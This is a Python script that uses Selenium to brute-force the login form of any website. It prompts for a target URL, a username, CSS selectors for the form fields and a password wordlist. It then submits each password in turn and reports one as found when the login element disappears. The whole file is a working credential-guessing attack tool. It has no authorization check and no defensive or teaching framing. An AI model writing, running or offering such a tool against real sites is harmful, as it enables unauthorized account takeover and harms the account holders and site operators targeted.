import selenium
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, SessionNotCreatedException
import time
import requests
from selenium.webdriver.common.keys import Keys

CHROME_PATH = 'C:/browser/chromedriver.exe'


def main():
    print_help_messages()
    init_brute_force_attack()


def print_help_messages():
    print('\n')
    print('You will need to copy the selector of name, password and login ' +
          'form.')
    print('After that, just specify the password list to brute force.')
    print('\n')
    print(' ====================== Copying selector of forms ======================')
    print('1. Right click on the component -> Inspect element')
    print('2. Click on the three dots on the superior left corner of the element')
    print('3. Copy -> Copy selector')
    print('\n')


def init_brute_force_attack():
    website = input('Insert the website url: ')
    print('Checking website...')
    if is_valid_website(website):
        username = input('Insert the username/e-mail for brute-force: ')

        username_selector = input('Insert the username selector: ')
        password_selector = input('Insert the password selector: ')
        login_button_selector = input('Insert the login button selector: ')

        password_list = input('Insert the wordlist location: ')

        brute_force(
            website,
            username,
            username_selector,
            password_selector,
            login_button_selector,
            password_list,
        )


def is_valid_website(website):
    valid_website = False
    try:
        request = requests.get(website)
        if request.status_code == 200:
            valid_website = True
            print('OK')
        else:
            print('Looks like an invalid website. Dont forget "http" or "https"' +
                  ' in your URL.')
            return init_brute_force_attack()

    except:
        print('Ops. I didnt find this website in anywhere... Dont forget "http" or "https" in your URL.')
        return init_brute_force_attack()

    return valid_website


def brute_force(website, username, username_selector, password_selector, login_button_selector, password_list):
    passwords = open(password_list, 'r')
    browser = webdriver.Chrome(CHROME_PATH)
    try:
        for password in passwords:
            browser.get(website)

            # fill the username field
            browser.find_element_by_css_selector(
                username_selector).send_keys(username)
            # fill the password field
            browser.find_element_by_css_selector(
                password_selector).send_keys(password)

            time.sleep(2)

            browser.find_element_by_css_selector(
                login_button_selector).send_keys(Keys.ENTER)

            print_tried_password(username, password)
    except KeyboardInterrupt:
        exit()
    except selenium.common.exceptions.NoSuchElementException:
        print_password_found(password)


def print_tried_password(user, password):
    print('=========================================================')
    print('Tried password ' + password + ' for user ' + user + '.')
    print('=========================================================')


def print_password_found(password):
    print('If you were not blocked, the password was found.')
    print('Password has been found: ' + password)
    return init_brute_force_attack()


if __name__ == '__main__':
    main()
